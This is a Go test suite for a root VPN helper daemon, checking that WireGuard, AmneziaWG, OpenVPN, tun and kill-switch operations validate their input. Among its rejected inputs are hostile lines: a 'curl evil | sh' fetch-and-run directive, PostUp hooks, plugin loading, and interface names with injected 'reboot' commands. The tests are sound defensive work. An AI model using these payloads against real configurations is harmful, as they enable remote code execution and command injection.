package server

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"katacomb.vpn/daemon/internal/ops"
	"katacomb.vpn/daemon/internal/protocol"
)

// A recording Env: every tool succeeds, nothing spawns, the interfaces the
// tools would create appear under the fake sysfs so the polls pass. These are
// the twenty cases daemon-core.test.ts held, plus the shape checks the
// TypeScript dispatcher did dynamically.
type rec struct {
	*ops.Env
	root  string
	cmds  [][]string
}

func newRec(t *testing.T) *rec {
	t.Helper()
	root := t.TempDir()
	r := &rec{root: root}
	link := func(name string) { _ = os.WriteFile(filepath.Join(root, "sys/class/net", name), nil, 0o644) }
	r.Env = &ops.Env{
		Run: func(_ context.Context, argv []string, _ ops.RunOpt) ([]byte, []byte, error) {
			r.cmds = append(r.cmds, argv)
			switch filepath.Base(argv[0]) {
			case "wg-quick":
				link("sntl0")
			case "openvpn":
				for i := 0; i+1 < len(argv); i++ {
					switch argv[i] {
					case "--writepid":
						_ = os.WriteFile(argv[i+1], []byte("4242\n"), 0o644)
					case "--log":
						_ = os.WriteFile(argv[i+1], []byte("Initialization Sequence Completed\n"), 0o644)
					}
				}
				link("sntl-ovpn")
			}
			return nil, nil, nil
		},
		Spawn: func(argv []string, _ ops.RunOpt) (int, error) {
			r.cmds = append(r.cmds, argv)
			if len(argv) > 1 && argv[1] == "_tun2socks" {
				link("sntl-tun")
			}
			if len(argv) > 1 && argv[1] == "_amneziawg" {
				link("sntl0")
			}
			return 555, nil
		},
		Executable: func() (string, error) { return filepath.Join(root, "usr/local/bin/katacomb-vpn-helper"), nil },
		Kill:     func(int, syscall.Signal) error { return syscall.ESRCH },
		Sleep:    func(time.Duration) {},
		Root:     root,
		LookPath: func(name string) (string, error) { return name, nil },
		Warn: func(string) {},
	}
	for _, d := range []string{"sys/class/net", "usr/sbin", "etc"} {
		if err := os.MkdirAll(filepath.Join(root, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for _, b := range []string{"usr/sbin/openvpn"} {
		if err := os.WriteFile(filepath.Join(root, b), []byte("#!/bin/sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return r
}

func (r *rec) lines() []string {
	var out []string
	for _, c := range r.cmds {
		out = append(out, strings.Join(c, " "))
	}
	return out
}

func (r *rec) has(sub string) bool {
	return strings.Contains(strings.Join(r.lines(), "\n"), sub)
}

func req(op string, args string) protocol.Request {
	r := protocol.Request{ID: 1, Op: op}
	if args != "" {
		r.Args = json.RawMessage(args)
	}
	return r
}

func call(t *testing.T, r *rec, op, args string) protocol.Response {
	t.Helper()
	return Dispatch(context.Background(), req(op, args), r.Env)
}

func mustJSON(v any) string {
	b, _ := json.Marshal(v)
	return string(b)
}

var (
	cleanWG   = read("../guard/testdata/corpus/wireguard/minimal.conf")
	cleanAWG  = read("../guard/testdata/corpus/amneziawg/minimal.conf")
	cleanOVPN = read("../guard/testdata/corpus/openvpn/minimal.conf")
)

func read(p string) string {
	b, err := os.ReadFile(p)
	if err != nil {
		panic(err)
	}
	return string(b)
}

func cfgArgs(cfg string) string { return mustJSON(map[string]string{"configString": cfg}) }

func TestWireguardUpAcceptsCleanConfigAndRunsWgQuickOnTheRootOwnedCopy(t *testing.T) {
	r := newRec(t)
	res := call(t, r, "wireguard_up", cfgArgs(cleanWG))
	if !res.OK {
		t.Fatalf("rejected: %s", res.Error)
	}
	want := "wg-quick up " + filepath.Join(r.root, ops.RunDir, "sntl0.conf")
	if got := r.lines(); len(got) != 1 || got[0] != want {
		t.Fatalf("want [%s], got %v", want, got)
	}
	fi, err := os.Stat(filepath.Join(r.root, ops.RunDir, "sntl0.conf"))
	if err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf("root-owned config must be 0600: %v %v", fi, err)
	}
	if b, _ := os.ReadFile(filepath.Join(r.root, ops.RunDir, "sntl0.conf")); string(b) != cleanWG {
		t.Fatal("the config written is not the config sent")
	}
}

func TestWireguardUpRejectsPostUpAndRunsNothing(t *testing.T) {
	r := newRec(t)
	evil := strings.Replace(cleanWG, "Address = 10.8.0.2/32", "PostUp = touch /tmp/pwned", 1)
	res := call(t, r, "wireguard_up", cfgArgs(evil))
	if res.OK || len(r.cmds) != 0 {
		t.Fatalf("got ok=%v cmds=%v", res.OK, r.cmds)
	}
	if !strings.Contains(res.Error, "not allowed") || strings.Contains(res.Error, "pwned") {
		t.Fatalf("error must say why without echoing the line: %s", res.Error)
	}
}

func TestWireguardUpRequiresConfigString(t *testing.T) {
	r := newRec(t)
	for _, args := range []string{"", `{}`, `{"configString":5}`, `{"configString":null}`, `"a string"`, `[1]`} {
		res := call(t, r, "wireguard_up", args)
		if res.OK || res.Error != "wireguard_up: configString required" {
			t.Errorf("args %q: got %+v", args, res)
		}
	}
	if len(r.cmds) != 0 {
		t.Fatal("nothing may run")
	}
}

func TestWireguardDownRemovesTheRootOwnedConfig(t *testing.T) {
	r := newRec(t)
	call(t, r, "wireguard_up", cfgArgs(cleanWG))
	if res := call(t, r, "wireguard_down", ""); !res.OK {
		t.Fatal(res.Error)
	}
	if _, err := os.Stat(filepath.Join(r.root, ops.RunDir, "sntl0.conf")); !os.IsNotExist(err) {
		t.Fatal("private key still on disk after down")
	}
}

func TestTunUpDropsDefaultRouteBypassAndSelfExecsTheEngine(t *testing.T) {
	r := newRec(t)
	res := call(t, r, "tun_up", mustJSON(map[string]any{
		"socksAddr": "127.0.0.1:1080", "remoteHost": "203.0.113.7", "gateway": "192.168.1.1", "iface": "eth0",
		"tun2socksBin": "/tmp/evil", // client-supplied path must be IGNORED
		"bypassRoutes": []any{"10.0.0.0/8", "0.0.0.0/0", 7, "junk"},
	}))
	if !res.OK {
		t.Fatalf("rejected: %s", res.Error)
	}
	if !r.has(filepath.Join(r.root, "usr/local/bin/katacomb-vpn-helper") + " _tun2socks -device tun://sntl-tun -proxy socks5://127.0.0.1:1080 -mtu 1400 -loglevel silent") {
		t.Fatalf("must self-exec the embedded engine, got %v", r.lines())
	}
	if r.has("/tmp/evil") {
		t.Fatal("client path used")
	}
	if !r.has("ip route add 10.0.0.0/8 via 192.168.1.1 dev eth0") || r.has("0.0.0.0/0") {
		t.Fatalf("bypass filtering wrong: %v", r.lines())
	}
}

func TestTunUpRejectsBadScalars(t *testing.T) {
	r := newRec(t)
	base := map[string]any{"socksAddr": "127.0.0.1:1080", "remoteHost": "203.0.113.7", "gateway": "192.168.1.1", "iface": "eth0"}
	cases := map[string]map[string]any{
		"tun_up: invalid remoteHost": {"remoteHost": "evil.example.com"},
		"tun_up: invalid socksAddr":  {"socksAddr": "localhost:1080"},
		"tun_up: invalid gateway":    {"gateway": 5},
		"tun_up: invalid iface":      {"iface": "eth0;reboot"},
	}
	for want, over := range cases {
		args := map[string]any{}
		for k, v := range base {
			args[k] = v
		}
		for k, v := range over {
			args[k] = v
		}
		if res := call(t, r, "tun_up", mustJSON(args)); res.OK || res.Error != want {
			t.Errorf("want %q, got %+v", want, res)
		}
	}
	if len(r.cmds) != 0 {
		t.Fatal("nothing may run")
	}
}

func TestDnsSetAllowList(t *testing.T) {
	r := newRec(t)
	if res := call(t, r, "dns_set", `{"dnsIp":"8.8.4.4"}`); res.OK || res.Error != "dns_set: DNS resolver not allowed" {
		t.Fatalf("got %+v", res)
	}
	if res := call(t, r, "dns_set", `{"dnsIp":"1.1.1.1"}`); !res.OK {
		t.Fatalf("got %+v", res)
	}
	if b, _ := os.ReadFile(filepath.Join(r.root, "etc/resolv.conf")); string(b) != "nameserver 1.1.1.1\n" {
		t.Fatalf("resolv.conf = %q", b)
	}
}

func TestStatusReadsTheInterfaceTable(t *testing.T) {
	r := newRec(t)
	_ = os.WriteFile(filepath.Join(r.root, "sys/class/net/sntl0"), nil, 0o644)
	res := call(t, r, "status", "")
	if !res.OK || string(res.Encode()) != `{"id":1,"ok":true,"result":{"wgUp":true,"tunUp":false,"ovpnUp":false}}` {
		t.Fatalf("got %s", res.Encode())
	}
}

func TestProtocolVersion(t *testing.T) {
	r := newRec(t)
	// The reply carries the op list as well as the number, so that an upgraded
	// app can tell a stale daemon what it cannot do before acting on it. Encoded
	// via a map, so Go sorts the keys: ops before version.
	got := string(call(t, r, "protocol_version", "").Encode())
	if !strings.HasPrefix(got, `{"id":1,"ok":true,"result":{"ops":["protocol_version",`) {
		t.Fatal(got)
	}
	if !strings.HasSuffix(got, `"dns_restore"],"version":1}}`) {
		t.Fatal(got)
	}
}

func TestUnknownOpIsRejected(t *testing.T) {
	r := newRec(t)
	res := call(t, r, "frobnicate", "")
	if res.OK || res.Error != "unknown op: frobnicate" || len(r.cmds) != 0 {
		t.Fatalf("got %+v", res)
	}
}

// The daemon no longer hands root a bin dir: the AmneziaWG device is compiled in
// and self-exec'd from the helper's own path, and the routing is done natively.
func TestAmneziawgUpSelfExecsTheEmbeddedDevice(t *testing.T) {
	r := newRec(t)
	res := call(t, r, "amneziawg_up", cfgArgs(cleanAWG))
	if !res.OK {
		t.Fatalf("rejected: %s", res.Error)
	}
	self := filepath.Join(r.root, "usr/local/bin/katacomb-vpn-helper")
	conf := filepath.Join(r.root, ops.RunDir, "sntl0.conf")
	if !r.has(self + " _amneziawg " + conf) {
		t.Fatalf("the device must be our own binary self-exec'd as _amneziawg, got %v", r.lines())
	}
	if !r.has("ip -4 rule add not fwmark 51820 table 51820") {
		t.Fatalf("the fwmark rule pair must be installed natively, got %v", r.lines())
	}
	for _, l := range r.lines() {
		if strings.Contains(l, "awg-quick") || strings.Contains(l, filepath.Join(r.root, "pinned")) {
			t.Fatalf("no vendored tool and no bin dir may ever be run: %q", l)
		}
	}
}

func TestAmneziawgUpRejectsPostUp(t *testing.T) {
	r := newRec(t)
	evil := strings.Replace(cleanAWG, "Jc = 4", "PostUp = touch /tmp/pwned", 1)
	if res := call(t, r, "amneziawg_up", cfgArgs(evil)); res.OK || len(r.cmds) != 0 {
		t.Fatalf("got %+v %v", res, r.cmds)
	}
}

func TestAmneziawgDown(t *testing.T) {
	r := newRec(t)
	if res := call(t, r, "amneziawg_down", ""); !res.OK || !r.has("ip link delete sntl0") {
		t.Fatalf("got %+v %v", res, r.lines())
	}
}

func TestOpenvpnUpPassesOnlyTheRootOwnedPathAndOurFlags(t *testing.T) {
	r := newRec(t)
	res := call(t, r, "openvpn_up", cfgArgs(cleanOVPN))
	if !res.OK {
		t.Fatalf("rejected: %s", res.Error)
	}
	conf := filepath.Join(r.root, ops.RunDir, "openvpn.conf")
	want := filepath.Join(r.root, "usr/sbin/openvpn") + " --config " + conf +
		" --dev sntl-ovpn --dev-type tun --script-security 0 --connect-timeout 10 --connect-retry-max 2 --verb 3 --log " +
		filepath.Join(r.root, ops.RunDir, "openvpn.log") + " --writepid " + filepath.Join(r.root, ops.RunDir, "openvpn.pid") + " --daemon katacomb-ovpn"
	if !r.has(want) {
		t.Fatalf("want %s\n got %v", want, r.lines())
	}
}

func TestOpenvpnUpRejectsScriptDirectives(t *testing.T) {
	r := newRec(t)
	for _, evil := range []string{
		strings.Replace(cleanOVPN, "nobind", `up /bin/sh -c "curl evil | sh"`, 1),
		strings.Replace(cleanOVPN, "nobind", "script-security 2", 1),
		strings.Replace(cleanOVPN, "nobind", "plugin /tmp/evil.so", 1),
	} {
		if res := call(t, r, "openvpn_up", cfgArgs(evil)); res.OK {
			t.Fatal("accepted a script directive")
		}
	}
	if len(r.cmds) != 0 {
		t.Fatal("nothing may run")
	}
}

func TestOpenvpnUpFailsClosedWhenNotInstalled(t *testing.T) {
	r := newRec(t)
	_ = os.Remove(filepath.Join(r.root, "usr/sbin/openvpn"))
	res := call(t, r, "openvpn_up", cfgArgs(cleanOVPN))
	if res.OK || res.Error != "openvpn is not installed" || len(r.cmds) != 0 {
		t.Fatalf("got %+v %v", res, r.cmds)
	}
}

func TestOpenvpnUpRequiresConfigString(t *testing.T) {
	r := newRec(t)
	if res := call(t, r, "openvpn_up", `{"configPath":"/tmp/evil.conf"}`); res.OK || res.Error != "openvpn_up: configString required" {
		t.Fatalf("got %+v", res)
	}
}

func TestOpenvpnDown(t *testing.T) {
	r := newRec(t)
	if res := call(t, r, "openvpn_down", ""); !res.OK || !r.has("ip link delete sntl-ovpn") {
		t.Fatalf("got %+v %v", res, r.lines())
	}
}

func TestKillswitchOnVariants(t *testing.T) {
	lan := "iptables -w 5 -A KATACOMB_KILLSWITCH -d 10.0.0.0/8 -j ACCEPT"
	dns := "iptables -w 5 -A KATACOMB_KILLSWITCH -o sntl0 -d 1.1.1.1/32 -p udp --dport 53 -j ACCEPT"
	cases := []struct {
		args         string
		wantLan, dns bool
	}{
		{`{"iface":"sntl0","remoteHost":"203.0.113.7"}`, false, false},
		{`{"iface":"sntl0","remoteHost":"203.0.113.7","lanSharing":true}`, true, false},
		{`{"iface":"sntl0","remoteHost":"203.0.113.7","dnsIp":"1.1.1.1","lanSharing":true}`, true, true},
		{`{"iface":"sntl0","remoteHost":"203.0.113.7","lanSharing":false}`, false, false},
		{`{"iface":"sntl0","remoteHost":"203.0.113.7","dnsIp":null}`, false, false},
	}
	for _, c := range cases {
		r := newRec(t)
		res := call(t, r, "killswitch_on", c.args)
		if !res.OK {
			t.Fatalf("%s: %s", c.args, res.Error)
		}
		if !r.has("iptables -w 5 -A KATACOMB_KILLSWITCH -d 203.0.113.7/32 -j ACCEPT") {
			t.Errorf("%s: endpoint not whitelisted", c.args)
		}
		if r.has(lan) != c.wantLan || r.has(dns) != c.dns {
			t.Errorf("%s: lan=%v dns=%v\n%v", c.args, r.has(lan), r.has(dns), r.lines())
		}
	}
}

func TestKillswitchOnRefusals(t *testing.T) {
	cases := map[string]string{
		`{"iface":"sntl0","remoteHost":"0.0.0.0"}`:                          "killswitch_on: remoteHost 0.0.0.0 whitelists nothing",
		`{"iface":"sntl0","remoteHost":"203.0.113.7","lanSharing":"yes"}`:   "killswitch_on: invalid lanSharing",
		`{"iface":"sntl0","remoteHost":"203.0.113.7","dnsIp":"one.one"}`:    "killswitch_on: invalid dnsIp",
		`{"iface":"sntl0;reboot","remoteHost":"203.0.113.7"}`:               "killswitch_on: invalid iface",
		`{"iface":"sntl0","remoteHost":"node.example.com"}`:                 "killswitch_on: invalid remoteHost",
		`{"remoteHost":"203.0.113.7"}`:                                      "killswitch_on: invalid iface",
	}
	for args, want := range cases {
		r := newRec(t)
		res := call(t, r, "killswitch_on", args)
		if res.OK || res.Error != want || len(r.cmds) != 0 {
			t.Errorf("%s: want %q, got %+v (cmds %v)", args, want, res, r.cmds)
		}
	}
}

func TestKillswitchOff(t *testing.T) {
	r := newRec(t)
	if res := call(t, r, "killswitch_off", ""); !res.OK || !r.has("iptables -w 5 -D OUTPUT -j KATACOMB_KILLSWITCH") {
		t.Fatalf("got %+v %v", res, r.lines())
	}
}

func TestReplyOmitsResultWhenNone(t *testing.T) {
	r := newRec(t)
	if got := string(call(t, r, "dns_restore", "").Encode()); got != `{"id":1,"ok":true}` {
		t.Fatal(got)
	}
}
